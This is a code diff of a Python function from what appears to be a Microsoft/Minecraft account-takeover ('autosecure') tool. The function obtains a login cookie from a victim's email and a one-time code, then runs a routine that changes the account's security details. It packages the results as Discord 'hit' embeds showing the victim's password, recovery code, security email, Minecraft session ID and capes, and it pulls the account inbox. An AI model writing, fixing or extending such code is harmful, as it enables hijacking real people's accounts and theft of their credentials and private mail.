@@ -10,34 +10,27 @@ from discord import Embed
 import httpx
 import time
 
-async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None):
+async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
     
     data = await getLiveData(session) # {urlPost, ppft}
-
-    msaauth = await getMSAAUTH(
-        session,
-        email,
-        device,
-        data,
-        code
-    )
-
-    print("[+] - Got Cookies! Polishing login cookie...")
-    host = await polishHost(session, msaauth)
-    print(f"MSAAUTH: {host}")
+    msaauth = await getMSAAUTH(session, email, device, data, code)
+    print(f"UnPolished MSAAUTH Cookie: {msaauth}")  
+    print("[+] - Polishing login cookie...")
+    
+    # host = await polishHost(session, msaauth)
+    # print(f"Polished MSAAUTH Cookie: {host}")   
     
     if not msaauth:
         print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
         return None
-    
     print("[+] - Got MSAAUTH | Starting to secure...")
-    initialTime = time.time()
 
-    account = await secure(session)
+    initialTime = time.time()
+    account = await secure(session, recovery)
+    finalTime = (time.time() - initialTime)
+
     print(account)
 
-    finalTime = (time.time() - initialTime)
- 
     infoEmbed = Embed()
  
     infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
@@ -55,15 +48,13 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
     hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
     hitEmbed.add_field(name="Email", value=f"```{account['email']}```", inline=False)
-    hitEmbed.add_field(name="Security Email", value=f"```{account['secEmail']}```", inline=True)
+    hitEmbed.add_field(name="Security Email", value=f"```{account['security_email']}```", inline=True)
     hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
-    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
+    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recovery_code']}```", inline=False)
  
     if account["method"] != "No Minecraft":
         
-        mcEmbed = Embed(
-
-        )
+        mcEmbed = Embed()
 
         ssidEmbed = Embed(
             title = "SSID",
@@ -84,7 +75,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
                 f"**Capes:** {account['capes']}\n"
                 f"**Email:** {account['email']}\n"
                 f"**Password:** {account['password']}\n"
-                f"**Recovery Code:** {account['recoveryCode']}"
+                f"**Recovery Code:** {account['recovery_code']}"
             ),
             "account_inbox": await getInbox(account["email"])
         }
